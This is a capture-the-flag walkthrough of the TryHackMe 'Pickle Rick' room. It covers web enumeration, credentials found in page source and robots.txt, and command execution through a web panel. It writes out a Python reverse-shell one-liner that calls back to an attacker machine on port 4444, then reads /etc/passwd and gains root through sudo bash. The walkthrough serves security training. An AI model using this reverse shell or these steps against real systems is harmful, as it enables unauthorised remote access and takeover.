# PICKLERICK ROOM

<p align="center">
  <a href="https://tryhackme.com/p/hernanicyber"><img src="https://denise.matehackers.org/bahackers/images/tryhackme/tryhackme-logo.png")
 alt="thm_profile" width="200" /></a>
  

Link -> https://tryhackme.com/room/picklerick

Difficulty -> Easy

------------------------------------------------

So first lets deploy the machine to attack it!

![Screenshot from 2020-12-13 19-02-29](https://user-images.githubusercontent.com/75812403/102021162-c1fd4100-3d75-11eb-9fd0-9c349f7e7069.png)


Let's go!

## 1 - Let's run nmap!

![nmap](https://user-images.githubusercontent.com/75812403/101993721-a9792200-3cb4-11eb-9e74-f58c791c2966.png)

As you can see, we there are two open ports ( 22 and 80), so 22 for SSH and 80 for HTTP, let's take a look if we can find something relevant on the website
with ```http://IP_MACHINE:80/```.

---------------------

![Screenshot from 2020-12-12 19-07-16](https://user-images.githubusercontent.com/75812403/101993765-18567b00-3cb5-11eb-8b41-1863454c857c.png)

Hmmmm nothing relevant on this page but we need to find the 3 secret ingredients to finish his pickle-reverse potion. Let's take a look of source code.

-----

![Screenshot from 2020-12-12 20-07-40](https://user-images.githubusercontent.com/75812403/101993860-b6e2dc00-3cb5-11eb-863a-758cbc5cf605.png)


Okay we found the username that we need to log in some page or something.

So we got the username that is -> **R1ckRul3s**
Now we need to find the password and a page to login.

-----------
## 2 - Let's see if we got more directories on this web page

Let's try to scan it with gobuster.

![Screenshot from 2020-12-12 20-10-56](https://user-images.githubusercontent.com/75812403/101993935-4daf9880-3cb6-11eb-9606-f39c2ff68b12.png)

Uhh, we got ```/robots.txt``` and ```/login.php``` let's see what we can find in the first page!

--------

![Screenshot from 2020-12-12 19-13-23](https://user-images.githubusercontent.com/75812403/101993954-76d02900-3cb6-11eb-93a3-9be82a21f9c9.png)

![Screenshot from 2020-12-12 19-13-30](https://user-images.githubusercontent.com/75812403/101993966-8bacbc80-3cb6-11eb-8f3e-07276a4a80e6.png)

On the /robots.txt we find this word.

Can be the password for the login that we need :).

---------

Now let's open the ```/login.php```

![Screenshot from 2020-12-12 19-47-28](https://user-images.githubusercontent.com/75812403/101994024-fa8a1580-3cb6-11eb-991c-5b7a12279aa9.png)

Maybe we can use the **R1ckRul3s** and **Wubbalubbadubdub** for the credentials, so let's try!

--------------

![Screenshot from 2020-12-12 19-26-27](https://user-images.githubusercontent.com/75812403/101994048-32915880-3cb7-11eb-8dc3-fadb25acd4fe.png)

We are in!! Now we can execute commands in this page. Let's just simply write the command ```ls``` to see what we got on this directorie.

And we got some interesting file ```Sup3rS3cretPickl3Ingred.txt``` now you can just read the file and you got the first flag! :)

But in this image we can see another interesting file .txt  ```clue.txt``` , so why we don't try to open it? Let's take a look inside of it!

------------------------

![Screenshot from 2020-12-12 19-33-54](https://user-images.githubusercontent.com/75812403/102020742-09ce9900-3d73-11eb-9477-8aaafea7f12b.png)

Hmm so to find the other ingridient we need to look around, so first let's see if we have python running on this machine, so that we can maybe, spawn a reverse shell!

-------------

![Screenshot from 2020-12-12 19-39-00](https://user-images.githubusercontent.com/75812403/102020814-6cc03000-3d73-11eb-8786-31948013ad52.png)


Uhhh we got python running on this machine, so let's create a python payload to spawn a reverse shell for us!

We can use this simple line of code ```python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP_OF_YOUR_MACHINE_IN_THE_THM_NETWORK",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'```

--------------------------------

Now let's create a netcat sessions listening on port 4444

![Screenshot from 2020-12-12 19-39-21](https://user-images.githubusercontent.com/75812403/102020874-f7a12a80-3d73-11eb-86d2-2a3a4b4e5098.png)

And bang!! We got in!!

So now we can take a look around filesystem, let's try to acess home directory first searching for some user directory, so let's run the command 
```cd /home``` , and we can find a directory with a name of ```rick``` let's get in and run command ```ls```

![Screenshot from 2020-12-12 19-45-54](https://user-images.githubusercontent.com/75812403/102021019-d0972880-3d74-11eb-92d0-df47fde82091.png)

We found the seconde flag!! One remains to complete this challenge!

---------------------

Now let's run the command ```cat /etc/passwd``` and we got a list of users and we can see that the **root** is using bash, let's try the command ```sudo bash```
to see if we are allowed to get the shell of root 


![Screenshot from 2020-12-12 19-49-29](https://user-images.githubusercontent.com/75812403/102021077-43a09f00-3d75-11eb-8f40-6ee557f9e5f8.png)


![Screenshot from 2020-12-12 19-49-36](https://user-images.githubusercontent.com/75812403/102021085-4dc29d80-3d75-11eb-9bed-d8897186922c.png)

Yep! And we are in, so now you just have to read the third and the last flag to complete this amazing and very funny challange!!

So challenge solved, hope you enjoyed, and of course I hope have helped you! :)
